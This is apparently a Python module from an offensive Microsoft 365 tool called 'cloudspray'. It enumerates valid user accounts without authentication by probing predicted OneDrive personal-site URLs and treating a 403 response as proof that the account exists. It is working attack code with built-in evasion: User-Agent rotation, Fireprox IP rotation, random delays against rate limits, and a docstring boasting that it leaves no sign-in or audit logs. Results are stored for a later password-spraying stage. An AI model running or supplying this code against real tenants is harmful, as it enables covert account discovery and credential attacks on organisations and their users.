"""OneDrive URL probing for user enumeration.

Passive technique that checks whether a user's OneDrive personal site exists
by probing the expected SharePoint URL. No authentication required.

How it works:
    Every M365 user with a OneDrive license gets a personal SharePoint site at a
    predictable URL derived from their email address:

        https://{tenant}-my.sharepoint.com/personal/{user_domain}/

    where ``{user_domain}`` is the email with ``@`` and ``.`` replaced by ``_``.
    For example, ``jane.doe@contoso.com`` becomes ``jane_doe_contoso_com``.

    Sending an unauthenticated HEAD request to that URL reveals the account's
    existence through the HTTP status code:

    - **403 Forbidden** -- the site exists but the caller lacks access. This
      confirms the user account is real and has OneDrive provisioned.
    - **404 Not Found** -- no personal site exists at that path, meaning the
      email does not correspond to a valid user (or OneDrive was never
      provisioned for them).
    - **401 Unauthorized** -- ambiguous; the request was rejected before
      SharePoint could confirm or deny the path. Treated as inconclusive.

Why this technique is useful:
    It is the quietest enumeration method available. The probes are simple HTTPS
    HEAD requests to a public-facing web server. They generate no Azure AD
    sign-in log entries and no mailbox audit events, making detection very
    unlikely. The main limitation is that it only works when the tenant has
    OneDrive/SharePoint Online enabled and users have been provisioned.

Dependencies:
    - ``cloudspray.constants.USER_AGENTS`` -- pool of browser User-Agent strings
      rotated per request to reduce fingerprinting risk.
    - ``cloudspray.state.db.StateDB`` -- persists each result so later modules
      (spraying, reporting) can consume confirmed users.
    - ``cloudspray.reporting.console.ConsoleReporter`` -- live terminal output.
"""

import random
import time

import requests

from cloudspray.constants import USER_AGENTS
from cloudspray.reporting.console import ConsoleReporter
from cloudspray.state.db import StateDB
from cloudspray.state.models import EnumResult
from cloudspray.utils import normalize_email

METHOD_NAME = "onedrive"


class OneDriveEnumerator:
    """Enumerate users via OneDrive personal site URLs.

    Probes ``https://{tenant}-my.sharepoint.com/personal/{user_formatted}/``
    where ``user_formatted`` is the full email address with ``@`` and ``.``
    replaced by underscores (e.g. ``john_smith_contoso_com``).

    Response interpretation:
        - 403 Forbidden  -- user exists (site exists but access denied)
        - 404 Not Found  -- user does not exist (or OneDrive not provisioned)
        - 401 Unauthorized -- ambiguous (may or may not exist)

    Usage example::

        enumerator = OneDriveEnumerator("contoso.com", db, reporter)
        valid = enumerator.enumerate(["john.smith", "jane.doe@contoso.com"])

    Args passed to ``__init__``:
        domain: Target tenant domain (e.g. ``contoso.com``). The tenant
            slug is derived as the portion before the first dot.
        db: State database for persisting enumeration results.
        reporter: Console reporter for real-time output and debug messages.
        proxy_session: Optional pre-configured ``requests.Session`` (e.g. one
            routed through Fireprox) for IP rotation. When ``None``, a plain
            session is created.
    """

    def __init__(
        self,
        domain: str,
        db: StateDB,
        reporter: ConsoleReporter,
        proxy_session: requests.Session | None = None,
    ):
        self._domain = domain
        # Extract the tenant slug (e.g. "contoso" from "contoso.com") used to
        # build the SharePoint "-my" subdomain.
        self._tenant = domain.split(".")[0]
        self._db = db
        self._reporter = reporter
        # Use the caller's session (which may route through Fireprox for IP
        # rotation) or fall back to a vanilla requests session.
        self._session = proxy_session or requests.Session()

    def _format_username(self, email: str) -> str:
        """Convert an email address into the OneDrive personal-site path segment.

        SharePoint personal sites use a URL-safe transformation of the full
        email: both ``@`` and ``.`` are replaced with underscores.

        Args:
            email: Full email address (e.g. ``jane.doe@contoso.com``).

        Returns:
            URL path segment (e.g. ``jane_doe_contoso_com``).
        """
        return email.replace("@", "_").replace(".", "_")

    def _build_url(self, email: str) -> str:
        """Build the OneDrive personal site URL for a given email address.

        Args:
            email: Full email address to look up.

        Returns:
            Fully qualified URL pointing to the user's personal SharePoint site.
        """
        formatted = self._format_username(email)
        return (
            f"https://{self._tenant}-my.sharepoint.com"
            f"/personal/{formatted}/"
        )

    def enumerate(self, usernames: list[str]) -> list[str]:
        """Probe OneDrive URLs for each user and record results.

        Sends an unauthenticated HEAD request to each user's predicted personal
        site URL. A 403 response confirms the account exists; a 404 means no
        matching account was found. All other status codes are treated as
        inconclusive and logged for manual review.

        Each result is persisted to the state database and printed to the
        console in real time.

        Args:
            usernames: Candidate email addresses (or bare usernames, which will
                be normalized to ``user@domain`` via :func:`normalize_email`).

        Returns:
            List of email addresses confirmed to exist via this technique.

        Raises:
            No exceptions are raised; network errors are caught and logged as
            debug messages, and the affected user is marked as not confirmed.
        """
        confirmed: list[str] = []
        # dict.fromkeys preserves insertion order while deduplicating, which is
        # faster and more readable than a seen-set loop.
        usernames = list(dict.fromkeys(usernames))

        for username in usernames:
            email = normalize_email(username, self._domain)
            url = self._build_url(email)
            exists = False

            try:
                # Rotate User-Agent to reduce fingerprinting across requests.
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                # HEAD is sufficient -- we only need the status code, not the
                # response body. allow_redirects follows any 302s that
                # SharePoint may issue before landing on the final status.
                response = self._session.head(url, timeout=10, allow_redirects=True, headers=headers)
                status = response.status_code

                if status == 403:
                    # 403 means the personal site exists but we lack
                    # permission -- this proves the user account is real.
                    exists = True
                    confirmed.append(email)
                elif status == 404:
                    # 404 means no personal site exists at this path.
                    exists = False
                else:
                    # 401 or other codes are ambiguous, treat as not confirmed
                    self._reporter.debug(
                        f"Ambiguous response for {email}: HTTP {status}"
                    )
                    exists = False

            except requests.RequestException as exc:
                self._reporter.debug(f"Request failed for {email}: {exc}")
                exists = False

            # Persist every result (including negatives) so the reporting module
            # can produce a complete picture of coverage.
            result = EnumResult(username=email, method=METHOD_NAME, exists=exists)
            self._db.record_enum_result(result)
            self._reporter.print_enum_result(email, exists, METHOD_NAME)

            # Small random delay to avoid rate limiting from SharePoint.
            time.sleep(random.uniform(0.5, 2.0))

        return confirmed
